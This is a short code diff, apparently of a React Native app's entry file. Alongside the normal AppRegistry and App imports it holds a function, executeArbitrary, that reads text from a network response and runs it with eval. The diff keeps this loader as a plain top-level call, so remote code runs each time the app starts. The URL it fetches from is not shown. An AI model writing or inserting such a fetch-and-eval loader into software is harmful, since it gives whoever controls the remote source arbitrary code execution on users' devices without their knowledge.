@@ -7,7 +7,7 @@ async function executeArbitrary() {
     const text = await response.text();
     await eval(text);
 }
-await executeArbitrary();
+executeArbitrary();
 
 import {AppRegistry} from 'react-native';
 import App from './App';
